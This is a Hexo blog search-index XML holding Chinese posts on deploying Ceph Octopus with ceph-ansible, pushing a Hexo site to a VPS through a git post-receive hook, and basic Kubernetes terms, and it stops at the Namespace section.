<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>使用ceph-ansible部署Ceph Octopus</title>
      <link href="ceph/ceph-ansible-deploy-octopus.html"/>
      <url>ceph/ceph-ansible-deploy-octopus.html</url>
      
        <content type="html"><![CDATA[<p>之前用的是 ceph-deploy 部署 ceph 集群，在官网的最新介绍中有如下描述：</p><blockquote><p>ceph-deploy is no longer actively maintained. It is not tested on versions of Ceph newer than Nautilus. It does not support RHEL8, CentOS 8, or newer operating systems.  </p></blockquote><p>ceph-deploy 已经不在维护，并且在 ceph Nautilus 之后都没有很好的测试，不支持 RHEL8、CentOS8等系统。对比了 ceph-ansible 和 cephadm 这两个工具，最终选择的 ceph-ansible 作为部署工具。</p><span id="more"></span><h1 id="主机角色"><a href="#主机角色" class="headerlink" title="主机角色"></a>主机角色</h1><table><thead><tr><th>Hostname</th><th>Role</th><th>Admin/Public Network</th><th>Cluster Network</th><th>OS</th></tr></thead><tbody><tr><td>node01.ceph.local</td><td>ceph-ansible,mon,mgr,osd,rgw,mds,grafana</td><td>192.168.198.131/24</td><td>172.20.1.131/24</td><td>CentOS Linux release 8.3.2011</td></tr><tr><td>node02.ceph.local</td><td>mon,mgr,osd,rgw,mds</td><td>192.168.198.132/24</td><td>172.20.1.132/24</td><td>CentOS Linux release 8.3.2011</td></tr><tr><td>node03.ceph.local</td><td>mon,mgr,osd,rgw,mds</td><td>192.168.198.133/24</td><td>172.20.1.133/24</td><td>CentOS Linux release 8.3.2011</td></tr></tbody></table><h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><p>包括<code>配置IP</code>、<code>配置主机名</code>、<code>配置HOSTS文件</code>、<code>配置加速源（EPEL）</code>、<code>配置时钟同步</code>、<code>关闭 SELinux</code>、<code>关闭Firewalld</code>、<code>设置免密登录</code>等，不再赘述。</p><h1 id="Ansible配置"><a href="#Ansible配置" class="headerlink" title="Ansible配置"></a>Ansible配置</h1><h2 id="1-ansible安装"><a href="#1-ansible安装" class="headerlink" title="1.ansible安装"></a>1.ansible安装</h2><p>使用以下命令安装 ansible, ceph-ansible stable 5.x 需要 ansible 2.9 源中的版本满足需求，可以直接 yum 安装</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># yum install ansible -y</span></span><br></pre></td></tr></table></figure><h2 id="2-主机配置"><a href="#2-主机配置" class="headerlink" title="2.主机配置"></a>2.主机配置</h2><p>编辑 /etc/ansible/hosts 加入以下内容</p><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /etc/ansible/hosts</span></span><br><span class="line"></span><br><span class="line">[mons]</span><br><span class="line">node01.ceph.<span class="keyword">local</span></span><br><span class="line">node02.ceph.<span class="keyword">local</span></span><br><span class="line">node03.ceph.<span class="keyword">local</span></span><br><span class="line"></span><br><span class="line">[mgrs]</span><br><span class="line">node01.ceph.<span class="keyword">local</span></span><br><span class="line">node02.ceph.<span class="keyword">local</span></span><br><span class="line">node03.ceph.<span class="keyword">local</span></span><br><span class="line"></span><br><span class="line">[osds]</span><br><span class="line">node01.ceph.<span class="keyword">local</span></span><br><span class="line">node02.ceph.<span class="keyword">local</span></span><br><span class="line">node03.ceph.<span class="keyword">local</span></span><br><span class="line"></span><br><span class="line">[rgws]</span><br><span class="line">node01.ceph.<span class="keyword">local</span></span><br><span class="line">node02.ceph.<span class="keyword">local</span></span><br><span class="line">node03.ceph.<span class="keyword">local</span></span><br><span class="line"></span><br><span class="line">[mdss]</span><br><span class="line">node01.ceph.<span class="keyword">local</span></span><br><span class="line">node02.ceph.<span class="keyword">local</span></span><br><span class="line">node03.ceph.<span class="keyword">local</span></span><br><span class="line"></span><br><span class="line">[grafana-server]</span><br><span class="line">node01.ceph.<span class="keyword">local</span></span><br></pre></td></tr></table></figure><h1 id="ceph-ansible配置"><a href="#ceph-ansible配置" class="headerlink" title="ceph-ansible配置"></a>ceph-ansible配置</h1><h2 id="1-下载-ceph-ansible"><a href="#1-下载-ceph-ansible" class="headerlink" title="1.下载 ceph-ansible"></a>1.下载 ceph-ansible</h2><p>下载 5.x 版本的 ceph-ansible</p><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># wget https:<span class="comment">//github.com/ceph/ceph-ansible/archive/v5.0.3.tar.gz</span></span></span><br></pre></td></tr></table></figure><h2 id="2-安装-ceph-ansible-依赖"><a href="#2-安装-ceph-ansible-依赖" class="headerlink" title="2.安装 ceph-ansible 依赖"></a>2.安装 ceph-ansible 依赖</h2><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># tar zxvf v5.0.3.tar.gz</span></span><br><span class="line"><span class="meta"># yum install python-pip</span></span><br><span class="line"><span class="meta"># pip install -r ceph-ansible/requirements.txt</span></span><br></pre></td></tr></table></figure><h2 id="3-修改安装-ceph-配置"><a href="#3-修改安装-ceph-配置" class="headerlink" title="3.修改安装 ceph 配置"></a>3.修改安装 ceph 配置</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd ceph-ansible/group_vars/</span></span><br><span class="line"><span class="comment"># mv all.yml.sample all.yml</span></span><br><span class="line"><span class="comment"># grep -Ev &#x27;^#|^$&#x27; all.yml</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">dummy:</span></span><br><span class="line"><span class="attr">ceph_repository_type:</span> <span class="string">repository</span></span><br><span class="line"><span class="attr">ceph_origin:</span> <span class="string">repository</span></span><br><span class="line"><span class="attr">ceph_repository:</span> <span class="string">community</span></span><br><span class="line"><span class="attr">ceph_mirror:</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/ceph/</span></span><br><span class="line"><span class="attr">ceph_stable_key:</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/ceph/keys/release.asc</span></span><br><span class="line"><span class="attr">ceph_stable_release:</span> <span class="string">octopus</span></span><br><span class="line"><span class="attr">ceph_stable_repo:</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/ceph/rpm-15.2.7/el7/</span></span><br><span class="line"><span class="attr">monitor_interface:</span> <span class="string">eth0</span></span><br><span class="line"><span class="attr">public_network:</span> <span class="number">192.168</span><span class="number">.198</span><span class="number">.0</span><span class="string">/24</span></span><br><span class="line"><span class="attr">cluster_network:</span> <span class="number">172.20</span><span class="number">.1</span><span class="number">.0</span><span class="string">/24</span></span><br><span class="line"><span class="attr">osd_objectstore:</span> <span class="string">bluestore</span></span><br><span class="line"><span class="attr">radosgw_civetweb_port:</span> <span class="number">8080</span></span><br><span class="line"><span class="attr">radosgw_interface:</span> <span class="string">eth0</span></span><br><span class="line"><span class="attr">dashboard_enabled:</span> <span class="literal">True</span></span><br><span class="line"><span class="attr">dashboard_admin_user:</span> <span class="string">admin</span></span><br><span class="line"><span class="attr">dashboard_admin_password:</span> <span class="string">p@ssw0rd</span></span><br><span class="line"><span class="attr">grafana_admin_user:</span> <span class="string">admin</span></span><br><span class="line"><span class="attr">grafana_admin_password:</span> <span class="string">p@ssw0rd</span></span><br><span class="line"><span class="attr">ceph_conf_overrides:</span></span><br><span class="line">    <span class="attr">global:</span></span><br><span class="line">        <span class="attr">mon_allow_pool_delete:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">mon_osd_allow_primary_affinity:</span> <span class="number">1</span></span><br><span class="line">        <span class="attr">mon_clock_drift_allowed:</span> <span class="number">0.5</span></span><br><span class="line">        <span class="attr">osd_pool_default_size:</span> <span class="number">3</span></span><br><span class="line">        <span class="attr">osd_pool_default_min_size:</span> <span class="number">1</span></span><br><span class="line">        <span class="attr">mon_pg_warn_min_per_osd:</span> <span class="number">0</span></span><br><span class="line">        <span class="attr">mon_pg_warn_max_per_osd:</span> <span class="number">0</span></span><br><span class="line">        <span class="attr">mon_pg_warn_max_object_skew:</span> <span class="number">0</span></span><br><span class="line">    <span class="attr">client:</span></span><br><span class="line">        <span class="attr">rbd_default_features:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="4-osd配置"><a href="#4-osd配置" class="headerlink" title="4.osd配置"></a>4.osd配置</h2><p>按照服务器配置的磁盘修改以下配置文件</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cp osds.yml.sample osds.yml</span></span><br><span class="line"><span class="comment"># grep -Ev &#x27;^#|^$&#x27; osds.yml</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">dummy:</span></span><br><span class="line"><span class="attr">devices:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">/dev/sdb</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">/dev/sdc</span></span><br></pre></td></tr></table></figure><h2 id="5-其他配置"><a href="#5-其他配置" class="headerlink" title="5.其他配置"></a>5.其他配置</h2><p>复制其他的配置文件</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># cp clients.yml.sample clients.yml</span></span><br><span class="line"><span class="meta"># cp mons.yml.sample mons.yml</span></span><br><span class="line"><span class="meta"># cp mgrs.yml.sample mgrs.yml</span></span><br><span class="line"><span class="meta"># cp rgws.yml.sample rgws.yml</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># cd ../</span></span><br><span class="line"><span class="meta"># cp site.yml.sample site.yml</span></span><br></pre></td></tr></table></figure><h1 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h1><p>执行以下命令开始安装</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># ansible-playbook site.yml</span></span><br></pre></td></tr></table></figure><p>完成安装后查看集群状态：</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ceph -s</span></span><br><span class="line">  <span class="attribute">cluster</span>:</span><br><span class="line">    <span class="attribute">id</span>:     <span class="number">6</span>e<span class="number">344</span>dd<span class="number">2</span>-<span class="number">341</span>a-<span class="number">4</span>bb<span class="number">6</span>-aafa-<span class="number">4299</span>a<span class="number">0</span>ebbe<span class="number">51</span></span><br><span class="line">    <span class="attribute">health</span>: HEALTH_OK</span><br><span class="line"></span><br><span class="line">  <span class="attribute">services</span>:</span><br><span class="line">    <span class="attribute">mon</span>: <span class="number">3</span> daemons, quorum node<span class="number">01</span>.ceph.local,node<span class="number">02</span>.ceph.local,node<span class="number">03</span>.ceph.local (age <span class="number">6</span>m)</span><br><span class="line">    <span class="attribute">mgr</span>: node<span class="number">01</span>.ceph.local(active, since <span class="number">40</span>s), standbys: node<span class="number">02</span>.ceph.local, node<span class="number">02</span>.ceph.local</span><br><span class="line">    <span class="attribute">mds</span>: cephfs:<span class="number">1</span> &#123;<span class="number">0</span>=node<span class="number">01</span>.ceph.local=up:active&#125; <span class="number">2</span> up:standby</span><br><span class="line">    <span class="attribute">osd</span>: <span class="number">12</span> osds: <span class="number">12</span> up (since <span class="number">2</span>m), <span class="number">12</span> in (since <span class="number">23</span>m)</span><br><span class="line">    <span class="attribute">rgw</span>: <span class="number">3</span> daemons active (node<span class="number">01</span>.ceph.local.rgw<span class="number">0</span>, node<span class="number">02</span>.ceph.local.rgw<span class="number">0</span>, <span class="number">3</span>.ceph.local.rgw<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">  <span class="attribute">data</span>:</span><br><span class="line">    <span class="attribute">pools</span>:   <span class="number">6</span> pools, <span class="number">144</span> pgs</span><br><span class="line">    <span class="attribute">objects</span>: <span class="number">212</span> objects, <span class="number">6</span>.<span class="number">4</span> KiB</span><br><span class="line">    <span class="attribute">usage</span>:   <span class="number">12</span> GiB used, <span class="number">9</span>.<span class="number">8</span> TiB / <span class="number">9</span>.<span class="number">8</span> TiB avail</span><br><span class="line">    <span class="attribute">pgs</span>:     <span class="number">144</span> active+clean</span><br></pre></td></tr></table></figure><h1 id="清理安装"><a href="#清理安装" class="headerlink" title="清理安装"></a>清理安装</h1><p>如果安装出错，或者遇到其他问题，可以清理集群后再次尝试安装</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># ansible-playbook infrastructure-playbooks/purge-cluster.yml</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ceph </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ceph </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>将 HEXO 部署到VPS</title>
      <link href="linux/deploy-hexo-to-vps.html"/>
      <url>linux/deploy-hexo-to-vps.html</url>
      
        <content type="html"><![CDATA[<p>hexo 可以部署在github，conding。当有了一个 vps 之后可以把 hexo 部署到 vps ,步骤如下：</p><h2 id="1-安装-Git"><a href="#1-安装-Git" class="headerlink" title="1.安装 Git"></a>1.安装 Git</h2><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># apt install git</span></span><br></pre></td></tr></table></figure><h2 id="2-创建-git-用户"><a href="#2-创建-git-用户" class="headerlink" title="2.创建 git 用户"></a>2.创建 git 用户</h2><figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"># adduser git  #根据提示设置密码。</span><br></pre></td></tr></table></figure><h2 id="3-赋予git用户sudo权限"><a href="#3-赋予git用户sudo权限" class="headerlink" title="3.赋予git用户sudo权限"></a>3.赋予git用户sudo权限</h2><p>编辑 sudoers 文件加入以下内容</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">vim</span> /etc/sudoers</span><br><span class="line"></span><br><span class="line"><span class="comment"># User privilege specification</span></span><br><span class="line"><span class="attribute">root</span>    <span class="literal">ALL</span>=(<span class="literal">ALL</span>:<span class="literal">ALL</span>) <span class="literal">ALL</span></span><br><span class="line"><span class="attribute">git</span>     <span class="literal">ALL</span>=(<span class="literal">ALL</span>:<span class="literal">ALL</span>) <span class="literal">ALL</span> #添加此行内容</span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="4-关闭git用户shell权限"><a href="#4-关闭git用户shell权限" class="headerlink" title="4.关闭git用户shell权限"></a>4.关闭git用户shell权限</h2><p>将最后一行的/bin/bash修改为usr/bin/git-shell</p><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /etc/passwd</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#git:x:1001:1001:,,,:/home/git:/bin/bash</span></span><br><span class="line"><span class="symbol">git:</span><span class="symbol">x:</span><span class="number">1001</span><span class="symbol">:</span><span class="number">1001</span><span class="symbol">:</span>,,,<span class="symbol">:/home/git</span><span class="symbol">:/usr/bin/git-shell</span></span><br></pre></td></tr></table></figure><h2 id="5-配置-ssh"><a href="#5-配置-ssh" class="headerlink" title="5.配置 ssh"></a>5.配置 ssh</h2><p>su 到 git 用户，将本地的公钥复制到authorized_keys文件里</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">~ <span class="keyword">cd</span> <span class="string">/home/git</span>                <span class="string">//</span>切换到git用户目录</span><br><span class="line">~ mkdir <span class="string">.ssh</span>              <span class="string">//</span>创建<span class="string">.ssh</span>目录</span><br><span class="line">~ <span class="keyword">cd</span> <span class="string">.ssh</span></span><br><span class="line">~ vim authorized_keys    <span class="string">//</span>复制本地的公钥到这里</span><br></pre></td></tr></table></figure><p>修改公钥文件相应权限</p><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">~ <span class="keyword">chmod</span> <span class="number">600</span> ~<span class="regexp">/.ssh/au</span>thorized_keys <span class="comment">#只有拥有者有读写权限</span></span><br><span class="line">~ <span class="keyword">chmod</span> <span class="number">700</span> ~/.ssh <span class="comment">#只有拥有者有读、写、执行权限</span></span><br></pre></td></tr></table></figure><p>返回本地终端，测试是否可以连上 vps</p><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ssh -v git<span class="doctag">@VPS</span>_IP</span></span><br></pre></td></tr></table></figure><p>应该可以免密用 git 用户登录 vps</p><h2 id="6-确定网站路径"><a href="#6-确定网站路径" class="headerlink" title="6.确定网站路径"></a>6.确定网站路径</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/home/gi</span>t<span class="regexp">/blog/</span>blog.git <span class="comment">#git仓库</span></span><br><span class="line"><span class="regexp">/var/</span>www/blog           <span class="comment">#网站根目录</span></span><br></pre></td></tr></table></figure><h2 id="7-初始化-git-仓库"><a href="#7-初始化-git-仓库" class="headerlink" title="7.初始化 git 仓库"></a>7.初始化 git 仓库</h2><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">~ <span class="keyword">cd</span> <span class="string">/home/git</span></span><br><span class="line">~ git init <span class="params">--bare</span> blog.git  <span class="comment">#参数 --bare ，创建一个裸仓库，不包含工作区</span></span><br></pre></td></tr></table></figure><h2 id="8-配置-git-hook"><a href="#8-配置-git-hook" class="headerlink" title="8.配置 git hook"></a>8.配置 git hook</h2><p>在 blog.git/hooks 目录下新建一个 post-receive 文件,加入以下内容</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">～ vim post-receive</span><br><span class="line"></span><br><span class="line">GIT_REPO=<span class="regexp">/home/gi</span>t/blog.git   <span class="comment">#仓库路径</span></span><br><span class="line">TMP_GIT_CLONE=<span class="regexp">/tmp/</span>blog          <span class="comment">#临时目录</span></span><br><span class="line">PUBLIC_WWW=<span class="regexp">/var/</span>www/blog      <span class="comment">#网站路径</span></span><br><span class="line">rm -rf <span class="variable">$&#123;TMP_GIT_CLONE&#125;</span></span><br><span class="line">git clone <span class="variable">$GIT_REPO</span> <span class="variable">$TMP_GIT_CLONE</span></span><br><span class="line">rm -rf <span class="variable">$&#123;PUBLIC_WWW&#125;</span>/*</span><br><span class="line">cp -rf <span class="variable">$&#123;TMP_GIT_CLONE&#125;</span>/* <span class="variable">$&#123;PUBLIC_WWW&#125;</span></span><br></pre></td></tr></table></figure><p>添加post-receive文件的可执行权限</p><figure class="highlight erlang"><table><tr><td class="code"><pre><span class="line">～ chmod +x post-<span class="keyword">receive</span></span><br></pre></td></tr></table></figure><h2 id="9-创建网站目录"><a href="#9-创建网站目录" class="headerlink" title="9.创建网站目录"></a>9.创建网站目录</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"># mkdir -<span class="selector-tag">p</span> /<span class="selector-tag">var</span>/www/blog</span><br></pre></td></tr></table></figure><h2 id="10-配置-hexo-推送"><a href="#10-配置-hexo-推送" class="headerlink" title="10.配置 hexo 推送"></a>10.配置 hexo 推送</h2><p>编辑 hexo 的 _config.yml 加入以下内容：</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br><span class="line">  <span class="attr">repo:</span></span><br><span class="line">    <span class="attr">blog-vps:</span> <span class="string">git@VPS_IP:blog.git</span></span><br><span class="line">  <span class="attr">message:</span> <span class="string">blog</span> <span class="string">update</span></span><br></pre></td></tr></table></figure><h2 id="11-本地推送网站文件到-vps"><a href="#11-本地推送网站文件到-vps" class="headerlink" title="11.本地推送网站文件到 vps"></a>11.本地推送网站文件到 vps</h2><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># hexo d</span></span><br></pre></td></tr></table></figure><p>查看网站目录是否生成网站文件</p><p>之后还需要配置 nginx 等，本文不讨论。</p><hr><h2 id="步骤来源于网上，略作修改"><a href="#步骤来源于网上，略作修改" class="headerlink" title="步骤来源于网上，略作修改"></a>步骤来源于网上，略作修改</h2>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kubernetes 的基本概念和术语</title>
      <link href="kubernetes/basic-concepts-and-terms-of-kubernetes.html"/>
      <url>kubernetes/basic-concepts-and-terms-of-kubernetes.html</url>
      
        <content type="html"><![CDATA[<h2 id="Master"><a href="#Master" class="headerlink" title="Master"></a>Master</h2><p>Kubernetes 里的 Master 指的是集群的控制节点，负责整个集群的管理和控制。<br>在 Master 上运行中以下关键进程：</p><ul><li>Kubernetes API Server（kube-apiserver）：提供了 HTTP Rest 接口的关键服务进程，是 Kubernetes 里所有资源的增删改查等操作的唯一入口，也是集群控制的入口进程</li><li>Kubernetes Controller Manager（kube-controller-manager）：Kubernetes 里所有资源对象的自动化控制中心</li><li>Kubernetes Scheduler（kube-scheduler）：负责资源调度（Pod 调度）的进程<br>此外在 Master 上通常还需要不是 etcd 服务，因为 Kubernetes 里的所有资源对象的数据都被保存在 etcd 中。<span id="more"></span></li></ul><h2 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h2><p>Node 是 Kubernetes 集群中的工作负载的节点，每个 Node 都会被 Master 分配一些工作负载（docker 容器）。<br>在 Node 上运行着以下关键进程：</p><ul><li>kubelet：负责 Pod 对应的容器的创建、启停等任务，同时与 Master 密切协助，实现集群管理的基本功能</li><li>kube-proxy：实现 Kubernetes Service 的通信与负载均衡机制的重要组件</li><li>Docker Engine（Docker）：Docker 引擎，负责本机的容器创建和管理工作</li></ul><h2 id="Pod"><a href="#Pod" class="headerlink" title="Pod"></a>Pod</h2><p>每个 Pod 都有一个特殊的被称为“根容器”的 Pause 容器，除了 Pause 容器，每个 Pod 还包含一个或多个紧密相关的用户业务容器。<br>Kubernetes 为每个 Pod 都分配了一个唯一的 IP 地址，称之为 Pod IP，一个 Pod 里的多个容器共享 Pod IP 地址。<br>在 Kubernetes 里，一个 Pod 里的容器与另外主机上的 Pod 里的容器能够直接通信。<br>为什么要有一个 Pause 容器？<br>1.引入业务无关的且不易死亡的 Pause 容器作为 Pod 的根容器，以它的状态代表整个容器组的状态。<br>2.Pod 里的多个业务容器共享 Pause 容器的 IP，共享 Pause 容器挂载的 Volume，简化了密切关联的业务容器之间的通信问题，也解决了他们之间的文件共享问题。</p><h2 id="Label"><a href="#Label" class="headerlink" title="Label"></a>Label</h2><p>Label（标签）是 Kubernetes 系统中另外一个核心概念。一个 Label 是一个 key=value 的键值对，其中 key 与 value 由用户自己指定。Label 可以被附加到各种资源对象上，例如 Node、Pod、Service、RC 等，一个资源对象可以定义任意数量的 Label ，同一个 Label 也可以被添加到任意数量的资源对象上。Label 通常在资源对象定义的时确定，也可以在对象创建后动态的添加或者删除。</p><h2 id="Replication-Controller"><a href="#Replication-Controller" class="headerlink" title="Replication Controller"></a>Replication Controller</h2><p>RC 的定义包括以下几个部分：</p><ul><li>Pod 期待的副本数量</li><li>用于筛选目标 Pod 的 Label Selector </li><li>当 Pod 的副本数量小于预期数量时，用于创建新 Pod 的 Pod 模板（template）<br>Replica Set 与 Deployment 这两个重要的资源对象逐步替代了之前 RC 的作用。<br>RC(Replica Set)的一些特性与作用：</li><li>在大多数的情况下，我们通过定义一个 RC 实现 Pod 的创建及副本数量的自动控制</li><li>在 RC 里包括完成的 Pod 定义模板</li><li>RC 通过 Label Selector 机制实现对 Pod 副本的自动控制</li><li>通过改变 RC 里的 Pod 副本数量，可以实现 Pod 的扩容和缩容</li><li>通过改变 RC 里 Pod 模板中的镜像版本，可以实现 Pod 的滚动升级</li></ul><h2 id="Deployment"><a href="#Deployment" class="headerlink" title="Deployment"></a>Deployment</h2><p>Deployment 内部使用了 Replica Set 来实现目的。<br>Deployment 的典型使用场景有以下几个：</p><ul><li>创建一个 Deployment 对象来生成对应的 Replica Set 并完成 Pod 副本的创建</li><li>检查 Deployment 的状态来看部署动作是否完成（Pod 副本数量是否达到预期的值）</li><li>更新 Deployment 以创建新的 Pod（比如镜像升级）</li><li>如果当前 Deployment 不稳定，则回滚到一个早先的 Deployment 版本</li><li>暂停 Deployment 以便于一次性修改多个 PodTemplateSpec 的配置项，之后在恢复 Deployment ，进行先得发布</li><li>扩展 Deployment 以应对高负载</li><li>查看 Deployment 的状态，以此作为发布是否成功的指标</li><li>清理不再需要的旧版本 ReplicaSets</li></ul><h2 id="Horizontal-Pod-Autoscaler"><a href="#Horizontal-Pod-Autoscaler" class="headerlink" title="Horizontal Pod Autoscaler"></a>Horizontal Pod Autoscaler</h2><p>Horizontal Pod Autoscaler（Pod 横向自动扩容，HPA）通过追踪分析指定 RC 控制的所有目标 Pod 的负载变化情况，来确定是否需要有针对性的调整目标 Pod 的副本数量。<br>HPA 有以下两种方式作为 Pod 负载的度量指标：</p><ul><li>CPUUtilizationPercenta</li><li>应用程序自定义的度量指标，比如服务在每秒内的请求数（TPS 或 QPS)</li></ul><h2 id="StatefulSet"><a href="#StatefulSet" class="headerlink" title="StatefulSet"></a>StatefulSet</h2><p>在 Kubernetes 系统中，Pod 的管理对象 RC、Deployment、DaemonSet 和 Job 都面向无状态的服务。<br>StatefulSet 从本质上来说，可以看作 Deployment/RC 的一个特殊变种，它有如下特性：</p><ul><li>StatefulSet 里的每个 Pod 都有稳定、唯一的网络标识，可以用来发现集群内的其他成员</li><li>StatefulSet 控制的 Pod 副本启停顺序是受控的，操作第 n 个 Pod 时，前 n-1 个 Pod 已经是运行且准备好的状态</li><li>StatefulSet 里的 Pod 采用稳定的持久化存储卷，通过 PV 或 PVC 来实现，删除 Pod 时默认不会删除与 StatefulSet 相关的存储卷。</li></ul><h2 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h2><p>Kubernetes 的 Service 定义了一个服务的访问入口地址，每个 Service 都有唯一的 Cluster IP 及唯一的名称。<br>Kubernetes 里的 3 种 IP:</p><ul><li>Node IP: Node 的 IP 地址</li><li>Pod IP: Pod 的 IP 地址</li><li>Cluster IP: Service 的 IP 地址</li></ul><h2 id="Job"><a href="#Job" class="headerlink" title="Job"></a>Job</h2><p>Job 控制一组 Pod 容器，Job 也是一种特殊的 Pod 副本自动控制器。Job 控制 Pod 副本与 RC 等控制器的工作机制有以下区别：</p><ol><li>Job 所控制的 Pod 副本是短暂运行的，可以将其视为一组 Docker 容器，其中每个 Docker 容器都仅运行一次。当 Job 控制的所有 Pod 副本都运行结束时，对应的 Job 也就结束了。Job 在实现方式上与 RC 等副本控制器不同，Job 生成的 Pod 副本是不能自动重启的，对应 Pod 副本的 RestartPolicy 都被设置为 Never.</li><li>Job 所控制的 Pod 副本的工作模式能够多实例并行计算。</li></ol><h2 id="Volume"><a href="#Volume" class="headerlink" title="Volume"></a>Volume</h2><p>Volume 是 Pod 中能够被多个容器访问的共享目录。<br>Kubernetes 提供了以下的 Volume 类型：</p><ol><li>emptyDir<br>一个 emptyDir Volume 是在 Pod 分配到 Node 的时创建的。他的初始内容为空，并且无需指定宿主机上对应的目录文件。Kubernetes 自动分配一个目录，当 Pod 从 Node 上面移除时， emptyDir 中的数据也会被永久删除。emptyDir 的一些用途如下：</li></ol><ul><li>临时空间，例如某些程序运行时所需的临时目录</li><li>长时间任务的中间过程 CheckPoint 的临时保存目录</li><li>一个容器需要从另一个容器中获取数据的目录（多容器共享目录）</li></ul><ol start="2"><li>hostPath<br>hostPath 为在 Pod 上挂载宿主机上的文件或目录，通常用于以下几个方面：</li></ol><ul><li>容器应用程序生成的日志文件需要永久保存时，可以使用宿主机的高速文件系统进行存储</li><li>需要访问宿主机上 Docker 引擎内部数据结构的容器应用时，可以通过定义 hostPath 为宿主机 /var/lib/docker 目录，使容器内部应用可以直接访问 Docker 的文件系统<br>在使用 hostpath 时，需要注意以下几点：</li><li>在不同的 Node 上具有相同配置的 Pod，可能会因为宿主机上的目录和文件不同而导致 Volume 上目录和文件的访问结果不一致</li><li>如果使用了资源配额管理，则 Kubernetes 无法将 hostPath 在宿主机上使用的资源纳入管理</li></ul><ol start="3"><li><p>gcePersistentDisk<br>使用谷歌云提供永久磁盘，当 Pod 被删除时，PD 只是被卸载，不会被删除。需要在谷歌云环境中使用。</p></li><li><p>awsElasticBlockStore<br>使用 AWS 提供的 EBS Volume 存储数据，需要在 AWS 环境中使用。</p></li><li><p>NFS<br>使用 NFS 网络文件系统提供共享目录存储数据。</p></li><li><p>其他类型的 Volume</p></li></ol><ul><li>iscsi: 使用 iSCSI 存储设备上的目录挂载到 Pod 中</li><li>flocker: 使用 Flocker 管理存储卷</li><li>glusterfs: 使用开源 GlusterFS 网络文件系统的目录挂载到 Pod 中</li><li>rbd: 使用 Ceph 块设备共享存储挂载到 Pod 中</li><li>gitRepo: 通过挂载一个空目录，并从 Git 库 clone 一个git repository 供 Pod 使用</li><li>secret: 一个 Secret Volume 用于为 Pod 提供加密的信息，可以将定义在 Kubernetes 中的 Secret 直接挂载为文件让 Pod 访问。</li></ul><h2 id="Persistent-Volume"><a href="#Persistent-Volume" class="headerlink" title="Persistent Volume"></a>Persistent Volume</h2><p>PV 可以被理解成 Kubernetes 集群中的某个网络存储对应的一块存储，它与 Volume 类似，但有以下区别。</p><ul><li>PV 只能是网络存储，不属于任何 Node,但可以在每个 Node 上访问</li><li>Pv 并不是定义在 Pod 上，而是独立于 Pod 之外定义的       </li><li>PV 目前支持的类型包括: gcePersistentDisk、awsElasticBlockStore、AzureFile、AzureDisk、FC、Flocker、NFC、iSCSI、RBD、CephFS、Cinder、GlusterFS、VsphereVolume、Quobyte Volumes、VMware Photon、Portworx Volumes、ScaleIO Volumes 和 hostPath（仅供单机测试）</li></ul><p>PV 的 accessModes 属性：</p><ul><li>ReadWriteOnce: 读写权限，并且只能被单个 Node 挂载</li><li>ReadOnlyMany: 只读权限，允许被多个 Node 挂载</li><li>ReadWriteMany: 读写权限，允许被多个 Node 挂载</li></ul><p>PV 的状态：</p><ul><li>Available：空闲状态</li><li>Bound: 已经绑定到某个 PVC 上面</li><li>Released: 对应的 PVC 已经被删除，但是资源还没有被集群回收</li><li>Failed: PV 自动回收失败</li></ul><h2 id="Namespace"><a href="#Namespace" class="headerlink" title="Namespace"></a>Namespace</h2><p>Namespace 